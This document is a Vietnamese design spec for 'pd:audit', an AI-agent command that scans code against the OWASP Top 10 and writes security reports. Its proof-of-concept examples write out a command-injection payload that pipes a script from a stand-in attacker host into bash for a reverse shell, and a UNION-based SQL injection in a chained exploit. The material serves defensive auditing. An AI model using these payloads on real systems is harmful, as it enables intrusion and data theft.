# Lệnh `pd:audit` — Kiểm toán Bảo mật OWASP Top 10

Thêm lệnh `pd:audit` để quét mã nguồn theo OWASP Top 10 bằng kiến trúc **1 template agent + dispatch theo category**. Lệnh hoạt động **độc lập** (quét bất kỳ dự án nào) và **tích hợp milestone** (là security gate bắt buộc trước `pd:complete-milestone`).

## Thiết kế chính

### Nguyên tắc kép: Độc lập + Tích hợp

| Chế độ                 | Khi nào                                              | Hành vi                                                                                                       |
| ---------------------- | ---------------------------------------------------- | ------------------------------------------------------------------------------------------------------------- |
| **Độc lập**            | Không có `.planning/` hoặc user chạy trên repo ngoài | Quét toàn bộ source → xuất `SECURITY_REPORT.md` tại thư mục gốc dự án                                         |
| **Tích hợp milestone** | Có `.planning/CURRENT_MILESTONE.md`                  | Quét scope milestone (git diff) → xuất vào `.planning/milestones/[version]/` → nếu có lỗ hổng, tạo fix phases |

Lệnh tự phát hiện ngữ cảnh — user KHÔNG cần chỉ định chế độ.

### Mô tả

Phân tích ngữ cảnh dự án (milestone phases, code patterns, git diff) để **chỉ chọn scanner category liên quan**, tránh gọi dư thừa — tiết kiệm token tối đa. Dùng **1 template agent duy nhất** (`pd-sec-scanner.md`) nhận `--category` parameter, dispatch theo `config/security-rules.yaml`. Scanner instance chạy theo lô (batch), giới hạn tối đa **2 instance đồng thời**. Ưu tiên dùng **FastCode MCP** (tree-sitter) và script để dò hàm/endpoint trước khi AI phân tích, tránh AI grep tốn token. Sau khi quét xong, agent reporter tổng hợp kết quả. Trong chế độ milestone: nếu có lỗ hổng CRITICAL/WARNING, hệ thống **tự động bổ sung giai đoạn fix** vào roadmap milestone hiện tại — sắp xếp theo **thứ tự gadget chain**.

### Deliverables (Sản phẩm bàn giao)

#### 1. Lệnh `pd:audit` (`commands/pd/audit.md`)

```yaml
---
name: pd:audit
description: Kiểm toán bảo mật — Quét OWASP Top 10 trên dự án hoặc milestone
model: sonnet
argument-hint: "[path] [--full | --only scanner1,scanner2] [--auto-fix] [--poc]"
allowed-tools:
  - Read
  - Write
  - Edit
  - Bash
  - Glob
  - Grep
  - AskUserQuestion
  - SubAgent
  - mcp_fastcode_code_qa
---
```

**Tham số:**

- `path` (tùy chọn): Đường dẫn dự án cần quét. Mặc định: thư mục hiện tại.

**Chế độ quét:**

- _(mặc định)_: **Smart mode** — phân tích ngữ cảnh → chỉ chạy scanner liên quan (xem mục "Chọn Scanner Thông minh").
- `--full`: Ép chạy đủ 13 scanner, bỏ qua smart selection. Dùng khi muốn audit toàn diện.
- `--only sqli,xss,cmdi`: Chỉ định chính xác scanner muốn chạy (bỏ qua smart selection). Dùng khi user đã biết cần quét gì. 3 base scanner (secrets, crypto, vuln-deps) vẫn luôn chạy kèm.
- `--auto-fix`: Sau khi audit, tự động tạo fix phases mà không cần hỏi người dùng xác nhận (chỉ khi có milestone).
- `--poc`: Yêu cầu tạo Proof of Concept cho mỗi lỗ hổng phát hiện. POC từng hàm trước, sau đó chain POC thành gadget chain exploit nếu có liên kết giữa các lỗ hổng.

**Tên viết tắt cho `--only`:**

| Viết tắt | Scanner đầy đủ             |
| -------- | -------------------------- |
| `sqli`   | pd-sec-sql-injection       |
| `xss`    | pd-sec-xss                 |
| `cmdi`   | pd-sec-cmd-injection       |
| `path`   | pd-sec-path-traversal      |
| `auth`   | pd-sec-auth                |
| `deser`  | pd-sec-deserialization     |
| `proto`  | pd-sec-prototype-pollution |
| `config` | pd-sec-misconfig           |
| `design` | pd-sec-insecure-design     |
| `log`    | pd-sec-logging             |

Ví dụ: `pd:audit --only path,cmdi,xss` → chạy 6 scanner (3 base + 3 chỉ định).

#### 2. Template Agent `pd-sec-scanner.md` + Config `security-rules.yaml`

**Thay vì tạo 13 file agent riêng lẻ → tạo 1 template + 1 config ngay từ đầu.**

**`commands/pd/agents/pd-sec-scanner.md`** — Template agent dùng chung:

- Nhận `--category` parameter (vd: `sqli`, `xss`, `cmdi`...)
- Load rules cụ thể từ `config/security-rules.yaml` theo category
- Cùng input/output format, severity scale, evidence schema cho mọi category
- Scanner instance = 1 lần dispatch template agent với 1 category

**`config/security-rules.yaml`** — Tập trung rules cho 13 OWASP category:

- Mỗi category chứa: patterns (regex + AST query), severity mapping, common fixes
- Dễ maintain: thêm/sửa rule chỉ cần update 1 file YAML
- Không cần tạo/xóa agent file khi thêm scanner category mới

**`commands/pd/agents/pd-sec-reporter.md`** — Reporter agent riêng (không gộp vào template).

**Lý do làm ngay (không đợi FINAL optimize):**

- Tạo 13 file rồi gộp = lãng phí công sức + phải maintain 13 file tạm
- 1 template + 1 config = ít file hơn, DRY từ đầu, dễ test
- Dispatch model đơn giản: `SubAgent(pd-sec-scanner, --category xss)` thay vì `SubAgent(pd-sec-xss)`

**Giảm**: 13 agent files → 1 template + 1 config + 1 reporter = **3 files**

#### 3. Workflow `workflows/audit.md`

Quy trình thực thi chi tiết cho lệnh `pd:audit`.

#### 4. Cập nhật `workflows/complete-milestone.md`

Thêm security gate: nếu chưa có `SECURITY_REPORT.md` trong `.planning/milestones/[version]/`, yêu cầu chạy `pd:audit` trước khi cho phép đóng milestone.

#### 5. Cập nhật `references/state-machine.md`

Thêm `pd:audit` vào luồng trạng thái. Cụ thể:

**5a. Luồng chính** — thêm `pd:audit` vào trước `pd:complete-milestone`:

```
        → [/pd:write-code] → Đang code
          → [/pd:test] → Đã test (tùy chọn)
          → [/pd:audit] → Đã audit (bắt buộc trước complete)   ← THÊM
          → [/pd:complete-milestone] → Milestone hoàn tất
```

**5b. Nhánh phụ** — thêm `pd:audit` chạy được bất kỳ lúc nào sau init:

```
**Nhánh phụ** (bất kỳ lúc nào sau init):
- `/pd:fix-bug` → điều tra + sửa lỗi
- `/pd:audit` → kiểm toán bảo mật                              ← THÊM
- `/pd:what-next` → kiểm tra tiến trình
```

**5c. Bảng điều kiện tiên quyết** — thêm dòng:

```
| `/pd:audit` | CONTEXT.md (milestone mode) hoặc không cần (standalone) | Gợi ý `/pd:init` nếu muốn smart mode |
```

#### 6. Cập nhật `workflows/what-next.md`

Thêm priority gợi ý `pd:audit` **TRƯỚC** `pd:complete-milestone` trong bảng ưu tiên Bước 4:

```
| Ưu tiên | Điều kiện                                                        | Gợi ý                  |
|---------|------------------------------------------------------------------|-------------------------|
| ...     | ...                                                              | ...                     |
| 7       | Phase hoàn tất, còn phases tiếp                                  | `/pd:plan [y.y]`        |
| 7.5     | Tất cả phases ✅, CHƯA CÓ SECURITY_REPORT.md trong milestone dir | `/pd:audit` ← THÊM MỚI |
| 8       | Tất cả phases ✅ + CÓ SECURITY_REPORT.md (hoặc clean)           | `/pd:complete-milestone` |
```

Logic: glob `.planning/milestones/[version]/SECURITY_REPORT.md` → không tồn tại → ưu tiên 7.5 → "Chưa kiểm toán bảo mật. Chạy `/pd:audit` trước khi đóng milestone."

Đồng thời cập nhật `commands/pd/what-next.md` execution_context nếu cần tham chiếu audit.

#### 7. Template `templates/security-fix-phase.md`

Template cho giai đoạn sửa lỗi bảo mật tự động tạo ra (chỉ dùng trong chế độ milestone).

---

### Phát hiện ngữ cảnh tự động

```
pd:audit khởi động:

1. Kiểm tra `.planning/CURRENT_MILESTONE.md` tồn tại?
   ├─ CÓ → Chế độ MILESTONE
   │   - Đọc version + danh sách phases đã hoàn thành
   │   - Scope quét: git diff milestone branch → files changed
   │   - Evidence lưu vào: .planning/milestones/[version]/security/
   │   - Report lưu vào: .planning/milestones/[version]/SECURITY_REPORT.md
   │   - Nếu có lỗ hổng → đề xuất/tạo fix phases (decimal numbering)
   │
   └─ KHÔNG → Chế độ ĐỘC LẬP
       - Scope quét: toàn bộ source (trừ node_modules, .venv, build, dist)
       - Evidence lưu vào: .security/evidence/
       - Report lưu vào: SECURITY_REPORT.md (thư mục gốc)
       - Chỉ báo cáo, KHÔNG tạo fix phases (không có roadmap để chèn)
```

### Điều kiện tiên quyết cho chế độ Độc lập

`pd:audit` chạy được trên BẤT KỲ repo nào — nhưng hiệu quả tối ưu khi có context đầy đủ:

| Điều kiện              | Bắt buộc? | Lý do                                                                           |
| ---------------------- | --------- | ------------------------------------------------------------------------------- |
| Repo đã `pd:init`      | KHÔNG     | Audit chạy được không cần `.planning/`. Nhưng nếu có → smart hơn                |
| FastCode MCP đang chạy | KHÔNG     | Nếu có → dùng tree-sitter tìm hàm (nhanh, chính xác). Nếu không → fallback grep |
| Git repo               | KHÔNG     | Nếu có → dùng `git diff` scope. Nếu không → quét toàn bộ                        |

**Khuyến nghị**: Nếu user muốn audit hiệu quả nhất, nên chạy `pd:init` trước để có `.planning/codebase/` index → smart selection chính xác hơn. Nhưng KHÔNG ép buộc — audit phải luôn hoạt động được.

---

### Tích hợp FastCode MCP (Tối ưu Token)

#### Nguyên tắc: Tool-first, AI-last

Scanner PHẢI ưu tiên dùng **tool/script** để discovery trước, AI chỉ **phân tích kết quả** — không để AI tự grep/đọc code tìm kiếm.

#### Pipeline 5 bước cho mỗi scanner instance

```
Bước 0: Session Delta (xem mục "Đối soát Phiên Cũ")
  ├─ Đọc evidence cũ cho category này
  ├─ Phân loại: KNOWN-UNFIXED (skip) / RE-VERIFY (scan lại) / NEW (scan mới)
  └─ Output: danh sách hàm cần scan + danh sách hàm skip + danh sách hàm re-verify

Bước 1: Discovery (Tool — KHÔNG tốn AI token)
  ├─ FastCode MCP có? → code_qa("list all functions that use exec/spawn/child_process", [repo_path])
  │   → Trả về danh sách hàm + file + line number (tree-sitter + vector search)
  ├─ FastCode MCP không có? → Bash: grep -rn "exec\|spawn\|child_process" --include="*.js" --include="*.ts"
  │   → Fallback grep, vẫn nhanh hơn AI đọc từng file
  ├─ Loại bỏ hàm đã SKIP (từ Bước 0)
  └─ Output: danh sách {file, function, line} cần kiểm tra (chỉ hàm mới + re-verify)

Bước 2: Analysis (AI — chỉ phân tích đúng trọng tâm)
  ├─ AI CHỈ đọc các hàm/file từ Bước 1 (không đọc toàn bộ codebase)
  ├─ Kiểm tra: user input có flow vào sink không? Có sanitize không?
  └─ Output: evidence table (PASS/FLAG/FAIL per function)

Bước 3: POC (chỉ khi --poc — xem mục "Chứng minh Khai thác")
  ├─ Với mỗi FAIL/FLAG: tạo POC đơn lẻ (payload + tái hiện + kết quả dự kiến)
  └─ Output: POC section trong evidence file

Bước 4: Evidence (Write — ghi kết quả)
  ├─ Ghi evidence file theo Function-Level Checklist format
  ├─ Merge kết quả mới + KNOWN-UNFIXED (từ Bước 0) vào cùng evidence
  └─ Cập nhật "Lịch sử Audit" ở cuối evidence file
```

#### FastCode MCP queries mẫu cho từng category

| Category              | `code_qa` query mẫu                                                                                                |
| --------------------- | ------------------------------------------------------------------------------------------------------------------ |
| `cmd-injection`       | `"List all functions that call exec, spawn, execFile, child_process, or shell commands"`                           |
| `sql-injection`       | `"List all functions that execute SQL queries, use ORM raw queries, or build dynamic query strings"`               |
| `xss`                 | `"List all functions that render user input to HTML, use innerHTML, dangerouslySetInnerHTML, or template engines"` |
| `path-traversal`      | `"List all functions that read/write files using user-provided paths or filenames"`                                |
| `auth`                | `"List all authentication and authorization middleware, JWT handlers, session managers, and role checks"`          |
| `deserialization`     | `"List all functions that deserialize data: JSON.parse with eval, yaml.load, pickle, or custom decoders"`          |
| `prototype-pollution` | `"List all functions that deep merge objects, use Object.assign with user input, or extend prototypes"`            |
| `secrets`             | `"Find all hardcoded strings that look like API keys, passwords, tokens, or connection strings"`                   |
| `crypto`              | `"List all cryptographic operations: hashing, encryption, random generation, and certificate handling"`            |
| `misconfig`           | `"List all server configuration: CORS setup, helmet/CSP headers, cookie settings, TLS config"`                     |
| `insecure-design`     | `"List all business logic functions: payment, balance, transfer, order processing, rate limiting"`                 |
| `logging`             | `"List all logging calls and check if any log user PII, passwords, tokens, or sensitive headers"`                  |
| `vuln-deps`           | _(Không dùng code_qa — chạy script: `npm audit --json \| jq`)_                                                     |

#### Khi nào KHÔNG dùng FastCode MCP

- `vuln-deps`: Chạy `npm audit` / `pip audit` / `cargo audit` trực tiếp → nhanh hơn AI
- `secrets`: Có thể dùng `grep -rn "password\|api_key\|secret" --include="*.env"` trước, FastCode bổ sung sau
- Project quá nhỏ (< 20 files): Grep đủ rồi, MCP overhead không đáng

---

### Đối soát Phiên Cũ (Session Delta)

#### Nguyên tắc: Không scan lại cái đã biết, chỉ verify cái đã fix

Mỗi lần `pd:audit` chạy, bước đầu tiên là đọc lại evidence + report cũ từ phiên trước để xác định delta:

```
Bước 0: Session Delta (đọc log cũ)

1. Tìm evidence cũ:
   ├─ MILESTONE: .planning/milestones/[version]/security/evidence_sec_*.md
   ├─ STANDALONE: .security/evidence/evidence_sec_*.md
   └─ Không tìm thấy? → First run → bỏ qua delta, scan toàn bộ

2. Phân loại từng finding trong evidence cũ:

   ┌───────────────────────────────────────────────────────
   │ Finding cũ (FAIL/FLAG)
   ├───────────────────────────────────────────────────────
   │ Có fix phase đã complete cho finding này?
   ├─ CÓ → 🔄 RE-VERIFY: Scan lại đúng hàm/file đó
   │   (xác nhận fix thực sự khắc phục lỗ hổng)
   │   Nếu PASS → đánh dấu ✅ FIXED trong report mới
   │   Nếu vẫn FAIL → giữ FAIL + ghi "fix không hiệu quả"
   ├───────────────────────────────────────────────────────
   │ KHÔNG có fix phase, hoặc fix phase chưa complete?
   └─ ⚠️ KNOWN-UNFIXED: Bỏ qua scan lại
       (lỗi đã biết, chưa fix → không cần tốn token scan lại)
       Nhưng VẪN giữ trong report mới với status KNOWN-UNFIXED
       Và VẪN dùng cho gadget chain analysis (điểm yếu vẫn còn)
   └───────────────────────────────────────────────────────

3. Xác định scope scan phiên này:
   ─ Hàm mới / file mới (chưa trong evidence cũ) → SCAN bình thường
   ─ Hàm đã PASS trong phiên cũ nhưng code đổi (git diff) → RE-SCAN
   ─ Hàm đã PASS và code không đổi → SKIP (giữ kết quả cũ)
   ─ Lỗi KNOWN-UNFIXED → SKIP scan nhưng giữ trong report
   ─ Lỗi có fix phase completed → RE-VERIFY (đúng hàm đó)
```

#### Evidence tích lũy qua phiên (Audit Log)

Mỗi evidence file giữ **lịch sử phiên** ở cuối file:

```markdown
## Lịch sử Audit

| Phiên     | Ngày       | Kết quả | Ghi chú                                             |
| --------- | ---------- | ------- | --------------------------------------------------- |
| Session 1 | 2026-03-20 | 2 FAIL  | Lần đầu scan                                        |
| Session 2 | 2026-03-24 | 1 FAIL  | execConvert() đã fix → PASS. exportToPdf() vẫn FAIL |
| Session 3 | 2026-03-26 | 0 FAIL  | Tất cả đã fix → PASS                                |
```

#### SECURITY_REPORT.md cũng ghi delta

Reporter tổng hợp thêm cột **Status** trong bảng master:

```markdown
| #   | Severity | File                   | Hàm           | Loại lỗ hổng      | Status         | Ghi chú                    |
| --- | -------- | ---------------------- | ------------- | ----------------- | -------------- | -------------------------- |
| 1   | ❌ FAIL  | src/api/export.js      | exportToPdf() | Command Injection | KNOWN-UNFIXED  | phiên 1: FAIL, chưa có fix |
| 2   | ✅ PASS  | src/utils/converter.js | execConvert() | Command Injection | 🔄 RE-VERIFIED | phiên 1: FAIL → fix → PASS |
| 3   | ⚠️ FLAG  | src/new/handler.js     | handleReq()   | Path Traversal    | NEW            | phiên này mới phát hiện    |
```

---

### Chứng minh Khai thác (POC — Proof of Concept)

#### Khi nào tạo POC

- **Mặc định**: Không tạo POC (chỉ báo cáo PASS/FLAG/FAIL + giải thích)
- **`--poc`**: Bắt buộc tạo POC cho MỌc FAIL và FLAG

#### Pipeline POC (khi dùng `--poc`)

```
Sau Bước 2 (Analysis) → thêm Bước 2.5:

Bước 2.5a: POC đơn lẻ (từng hàm)
  │
  ├─ Với mỗi FAIL/FLAG:
  │   1. Xác định input vector (tham số nào attacker kiểm soát)
  │   2. Tạo payload mẫu chứng minh exploit
  │   3. Mô tả bước tái hiện (curl/script/manual)
  │   4. Ghi kết quả dự kiến (RCE, data leak, XSS fire...)
  │
  └─ Output: POC table trong evidence

Bước 2.5b: Gadget Chain POC (liên kết lỗ hổng)
  │
  ├─ Thu thập TẤT CẢ FAIL/FLAG từ MỌI category (đã scan xong)
  │   + bao gồm cả KNOWN-UNFIXED từ phiên cũ
  │
  ├─ Phân tích liên kết:
  │   - Vul A output có thể là input của Vul B không?
  │   - Vul A escalate privilege → Vul B có impact lớn hơn không?
  │   - Chain dài nhất dẫn đến RCE/Data Breach là gì?
  │
  └─ Output: Gadget Chain POC trong SECURITY_REPORT.md
      - Chain diagram: Vul A → Vul B → Vul C → Impact
      - Combined payload: bước khai thác tuần tự đầy đủ
      - Severity đánh lại: chain impact > individual impact
```

#### Format POC trong evidence

Mỗi evidence file thêm section POC khi dùng `--poc`:

```markdown
## POC — [pd-sec-cmd-injection]

### POC-1: execConvert() — RCE qua filename

**Input vector**: `req.body.filename`
**Payload**: `; curl http://attacker.com/shell.sh | bash`
**Tái hiện**:
\`\`\`bash
curl -X POST http://localhost:3000/api/convert \
 -H "Content-Type: application/json" \
 -d '{"filename": "; curl http://attacker.com/shell.sh | bash", "format": "pdf"}'
\`\`\`
**Kết quả dự kiến**: Server thực thi shell command, attacker được reverse shell
**Severity**: CRITICAL (RCE)

### POC-2: exportToPdf() — RCE qua template path

...
```

#### Format Gadget Chain POC trong SECURITY_REPORT

```markdown
## Gadget Chain Analysis

### Chain #1: IDOR → Secret Leak → SQLi → Data Breach (Severity: CRITICAL)

\`\`\`
Ước tính impact: Full database dump

Bước 1 (pd-sec-auth): IDOR tại GET /api/users/:id
→ Đọc được profile admin, trong đó có field `apiKey`

Bước 2 (pd-sec-secrets): apiKey là DB connection string hardcode
→ Attacker có DB credentials

Bước 3 (pd-sec-sqli): Endpoint /api/reports dùng raw query
→ Với DB creds + SQLi = full dump
\`\`\`

**Combined Payload**:
\`\`\`bash

# Bước 1: Khai thác IDOR

curl http://localhost:3000/api/users/1 -H "Authorization: Bearer <user_token>"

# → Response chứa {"apiKey": "postgres://admin:pass@db:5432/prod"}

# Bước 2: Dùng creds từ bước 1 + SQLi

curl "http://localhost:3000/api/reports?filter=1' UNION SELECT \* FROM users--"

# → Full user table dump

\`\`\`

**Tổng severity**: CRITICAL (đơn lẻ: IDOR=WARNING, Secret=FLAG, SQLi=FAIL → chain=CRITICAL)
```

---

### Chọn Scanner Thông minh (Smart Selection)

#### Nguyên tắc

Không phải mọi scanner đều liên quan đến mọi tính năng. File upload không cần kiểm tra SQL Injection. Blog post không cần kiểm tra Path Traversal. Chạy scanner không liên quan = **lãng phí token + không tìm thấy gì**.

Smart selection phân tích ngữ cảnh rồi chỉ kích hoạt scanner có khả năng phát hiện lỗi thực tế.

#### Nguồn tín hiệu

| Chế độ         | Nguồn phân tích                                                                                                              | Ưu tiên                       |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------- | ----------------------------- |
| **Milestone**  | ROADMAP.md (phase title + description) → PLAN.md (task mô tả) → git diff (files changed) → FastCode MCP / grep code patterns | Phase context trước, code sau |
| **Standalone** | FastCode MCP `code_qa` trên toàn bộ repo (nếu có) → Grep code patterns (fallback)                                            | Tool trước, grep sau          |

#### Bảng ánh xạ tín hiệu → Scanner

3 scanner **LUÔN CHẠY** (base set — ít token, phát hiện lỗi nền tảng):

| Scanner            | Lý do luôn chạy                                       |
| ------------------ | ----------------------------------------------------- |
| `pd-sec-secrets`   | Hardcoded secret/API key có thể nằm ở BẤT KỲ file nào |
| `pd-sec-crypto`    | Weak hash/PRNG có thể dùng sai ở mọi module           |
| `pd-sec-vuln-deps` | Dependency lỗi thời ảnh hưởng toàn dự án              |

10 scanner **CÓ ĐIỀU KIỆN** — chỉ kích hoạt khi phát hiện tín hiệu trong code:

| Tín hiệu code (grep pattern)                                                                                  | Scanner kích hoạt                              | Ví dụ tính năng                         |
| ------------------------------------------------------------------------------------------------------------- | ---------------------------------------------- | --------------------------------------- |
| `multer\|formidable\|busboy\|upload\|multipart\|file.*input\|createWriteStream`                               | **path-traversal**, **cmd-injection**, **xss** | File upload, media processing           |
| `query\|execute\|findOne\|findMany\|prisma\|sequelize\|knex\|mongoose\|\$where\|rawQuery\|createQueryBuilder` | **sql-injection**                              | CRUD, search, report                    |
| `exec\|spawn\|child_process\|shell.*true\|system(\|popen\|%x{`                                                | **cmd-injection**                              | CLI wrapper, file conversion, ffmpeg    |
| `innerHTML\|dangerouslySetInnerHTML\|document\.write\|v-html\|res\.send(.*req\|\{\{\{.*\}\}\}`                | **xss**                                        | Blog post, comment, profile, CMS        |
| `readFile\|writeFile\|createReadStream\|path\.join\|path\.resolve\|fs\.access\|unlink`                        | **path-traversal**                             | File serve, download, delete            |
| `jwt\|session\|passport\|bcrypt\|login\|authenticate\|authorize\|middleware\|guard\|role`                     | **auth**                                       | Login, register, RBAC, API auth         |
| `deserialize\|unserialize\|pickle\|yaml\.load\|eval(\|ObjectInputStream\|readObject`                          | **deserialization**                            | Config parse, data import, webhook      |
| `\.prototype\|Object\.assign\|merge(\|defaultsDeep\|lodash\.merge\|extend(`                                   | **prototype-pollution**                        | Config merge, plugin system, deep clone |
| `helmet\|cors\|csp\|X-Frame\|cookie.*secure\|https\|TLS\|certificate\|proxy`                                  | **misconfig**                                  | Server setup, middleware config, deploy |
| `render\|template\|ejs\|pug\|handlebars\|mustache\|nunjucks\|eta`                                             | **xss**, **deserialization** (SSTI)            | Email template, page render, invoice    |
| `payment\|stripe\|checkout\|order\|balance\|transfer\|invoice\|billing\|stock\|quantity`                      | **insecure-design**, **logging**               | E-commerce, fintech, transaction        |
| `console\.log\|logger\|winston\|pino\|morgan\|audit.*log\|sentry\|datadog`                                    | **logging**                                    | Bất kỳ (kiểm tra PII leak trong log)    |

#### Ví dụ thực tế

```
Milestone "v1.2 — Chức năng Upload Avatar"

  ROADMAP phase title: "Upload avatar + resize thumbnail"
  PLAN tasks: multer middleware, sharp resize, S3 storage
  Git diff: src/upload/*, src/middleware/multer.ts, src/utils/image.ts

  → Tín hiệu phát hiện: multer, createWriteStream, sharp (spawn), path.join
  → Scanner kích hoạt:
    ✅ pd-sec-secrets      (luôn chạy)
    ✅ pd-sec-crypto        (luôn chạy)
    ✅ pd-sec-vuln-deps     (luôn chạy)
    ✅ pd-sec-path-traversal (path.join + file write)
    ✅ pd-sec-cmd-injection  (sharp có thể gọi native process)
    ✅ pd-sec-xss            (filename injection → stored XSS)
  → Scanner BỎ QUA:
    ❌ pd-sec-sql-injection  (không có query/ORM nào đổi)
    ❌ pd-sec-auth           (không có auth logic mới)
    ❌ pd-sec-deserialization (không có deserialize)
    ❌ pd-sec-prototype-pollution (không có merge/extend)
    ❌ pd-sec-misconfig      (không thay đổi server config)
    ❌ pd-sec-insecure-design (không có business logic phức tạp)
    ❌ pd-sec-logging        (không có payment/sensitive action)

  Kết quả: 6 scanner thay vì 13 → tiết kiệm ~54% token
```

```
Milestone "v1.3 — API Đặt hàng + Thanh toán"

  → Tín hiệu: prisma, stripe, jwt, order, balance, logger
  → Scanner kích hoạt:
    ✅ pd-sec-secrets, pd-sec-crypto, pd-sec-vuln-deps (luôn chạy)
    ✅ pd-sec-sql-injection   (prisma queries)
    ✅ pd-sec-auth             (jwt, order authorization)
    ✅ pd-sec-insecure-design  (payment, balance race condition)
    ✅ pd-sec-logging          (payment audit trail)
    ✅ pd-sec-xss              (order input display)
  → BỎ QUA: path-traversal, cmd-injection, deserialization,
            prototype-pollution, misconfig

  Kết quả: 8 scanner thay vì 13 → tiết kiệm ~38% token
```

#### Fallback: Khi không đủ tín hiệu

- Nếu grep không phát hiện pattern nào (project mới, code quá ít) → chạy đủ 13 scanner (fallback = `--full`).
- Nếu tìm thấy < 2 tín hiệu → cảnh báo: "Không đủ tín hiệu để chọn scanner. Chạy full?" → hỏi user.
- `--full` luôn bỏ qua smart selection, chạy đủ 13.
- `--only` luôn bỏ qua smart selection, chỉ chạy scanner user chỉ định + 3 base.

---

### Kiến trúc Batch Execution (Chạy lô 2 instance)

#### Nguyên tắc phân lô

Sau khi smart selection chọn N category (3 ≤ N ≤ 13), xếp vào wave theo **dependency logic** — category nền tảng trước, category phụ thuộc sau. Mỗi wave tối đa 2 scanner instance song song (cùng template `pd-sec-scanner.md`, khác `--category`):

```
Full order (13 category — khi dùng --full):

Wave 1: [--category secrets]         + [--category crypto]           ← A02: Nền tảng mật mã (luôn chạy)
Wave 2: [--category sqli]            + [--category cmdi]             ← A03: Injection cơ bản
Wave 3: [--category xss]             + [--category path]             ← A03/A10: Injection + SSRF
Wave 4: [--category auth]            + [--category config]           ← A01/A05: Access + Config
Wave 5: [--category deser]           + [--category proto]            ← A08/A03: Integrity
Wave 6: [--category design]          + [--category vuln-deps]        ← A04/A06: Design + Deps (vuln-deps luôn chạy)
Wave 7: [--category log]                                             ← A09: Logging
Wave 8: [pd-sec-reporter]                                            ← Tổng hợp

Smart mode ví dụ (6 category — upload avatar):

Wave 1: [--category secrets]        + [--category crypto]            ← Luôn chạy
Wave 2: [--category cmdi]           + [--category path]              ← Upload signals
Wave 3: [--category xss]            + [--category vuln-deps]         ← XSS filename + luôn chạy
Wave 4: [pd-sec-reporter]                                            ← Tổng hợp
```

Category không được chọn sẽ **không dispatch** — wave rỗng bị bỏ qua.

**`--only` mode** ví dụ (`pd:audit --only path,cmdi,xss`):

```
Wave 1: [--category secrets]        + [--category crypto]            ← Luôn chạy
Wave 2: [--category cmdi]           + [--category path]              ← User chỉ định
Wave 3: [--category xss]            + [--category vuln-deps]         ← User chỉ định + luôn chạy
Wave 4: [pd-sec-reporter]                                            ← Tổng hợp
```

#### Cơ chế kiểm soát tài nguyên

- **Concurrency limit**: Tối đa 2 scanner instance cùng lúc.
- **Timeout per agent**: 120 giây cho Scout tier, 180 giây cho Builder tier.
- **Backpressure**: Nếu agent A xong trước agent B, KHÔNG bắt đầu wave tiếp cho đến khi cả 2 agent trong wave hiện tại hoàn tất.
- **Failure isolation**: Nếu 1 agent lỗi/timeout, ghi nhận `inconclusive` và tiếp tục wave tiếp — reporter sẽ cảnh báo scanner thiếu.

---

### Quy trình tổng thể (Workflow)

```
┌─────────────────────────────────────────────────────────────┐
│                         pd:audit                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Phát hiện ngữ cảnh:                                     │
│     - Có .planning/CURRENT_MILESTONE.md → MILESTONE mode    │
│     - Không có → STANDALONE mode                            │
│                                                             │
│  2. Đối soát phiên cũ (Session Delta):                      │
│     - Đọc evidence + SECURITY_REPORT cũ (nếu có)            │
│     - Phân loại: KNOWN-UNFIXED / RE-VERIFY / NEW            │
│     - KNOWN-UNFIXED → giữ cho gadget chain, skip scan       │
│     - RE-VERIFY → scan lại đúng hàm đã fix                  │
│                                                             │
│  3. Xác định scope quét:                                    │
│     - MILESTONE: git diff milestone branch → files changed  │
│     - STANDALONE: toàn bộ src/ (trừ vendor, build)          │
│     - Loại bỏ hàm đã SKIP từ session delta                  │
│                                                             │
│  4. Smart Selection: phân tích tín hiệu → chọn category     │
│     - FastCode MCP code_qa (nếu có) hoặc grep patterns      │
│     - Match với bảng ánh xạ → danh sách category cần chạy    │
│     - Luôn bao gồm: secrets + crypto + vuln-deps             │
│     - --full: bỏ qua selection, chạy đủ 13 category          │
│     - --only: user chỉ định category, bỏ qua selection       │
│                                                             │
│  5. Dispatch N scanner instance (template + category)        │
│     ┌───────────────────┐  ┌───────────────────┐             │
│     │ pd-sec-scanner    │  │ pd-sec-scanner    │             │
│     │ --category sqli   │  │ --category cmdi   │ ← Wave N   │
│     └────────┬──────────┘  └────────┬──────────┘             │
│              └──────────┬───────────┘                         │
│                         ▼                                    │
│     Mỗi instance: delta→discovery→analysis→(POC)→evidence   │
│     Chờ cả 2 xong → bắt đầu Wave N+1                       │
│                                                             │
│  6. pd-sec-reporter tổng hợp → SECURITY_REPORT.md           │
│     - Merge NEW + KNOWN-UNFIXED + RE-VERIFIED               │
│     - Ghi status column (NEW/KNOWN-UNFIXED/RE-VERIFIED/FIXED)│
│     - Nếu --poc: Gadget Chain POC analysis                   │
│       (chain KNOWN-UNFIXED + NEW FAIL thành exploit chuỗi)  │
│                                                             │
│  7. Phân tích kết quả:                                      │
│     ┌─────────────────────────────────────────┐              │
│     │ 0 CRITICAL + 0 WARNING = PASS ✅        │              │
│     ├─────────────────────────────────────────┤              │
│     │ STANDALONE: Hiển thị kết quả, xong.     │              │
│     │ MILESTONE:  Cho phép pd:complete-ms      │              │
│     ├─────────────────────────────────────────┤              │
│     │ Có WARNING, 0 CRITICAL = CONDITIONAL ⚠️ │              │
│     │ STANDALONE: Liệt kê cảnh báo            │              │
│     │ MILESTONE:  Hỏi user fix/accept          │              │
│     ├─────────────────────────────────────────┤              │
│     │ Có CRITICAL = BLOCK 🛑                   │              │
│     │ STANDALONE: Liệt kê + đề xuất hướng fix │              │
│     │ MILESTONE:  Bắt buộc tạo fix phases      │              │
│     └─────────────────────────────────────────┘              │
│                                                             │
│  8. MILESTONE + cần fix → Tạo fix phases (xem mục dưới)    │
│                                                             │
│  9. Lưu SECURITY_REPORT.md:                                 │
│     - MILESTONE: .planning/milestones/[version]/            │
│     - STANDALONE: thư mục gốc dự án                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

### Output bắt buộc: Function-Level Checklist

Mỗi scanner PHẢI xuất **bảng kiểm tra theo hàm/endpoint**, không chỉ nói chung chung "đã quét xong". Đây là yêu cầu cốt lõi để biết scanner có quét đúng trọng tâm và không bỏ sót hàm nào.

#### Format evidence cho mỗi scanner

```markdown
## Evidence — [pd-sec-cmd-injection]

### Phạm vi: milestone v2.8.0, phase 72-75

| #   | File                   | Hàm/Endpoint     | Loại kiểm tra     | Kết quả | Ghi chú                            |
| --- | ---------------------- | ---------------- | ----------------- | ------- | ---------------------------------- |
| 1   | src/utils/converter.js | execConvert()    | Command Injection | ❌ FAIL | exec() với user input, line 45     |
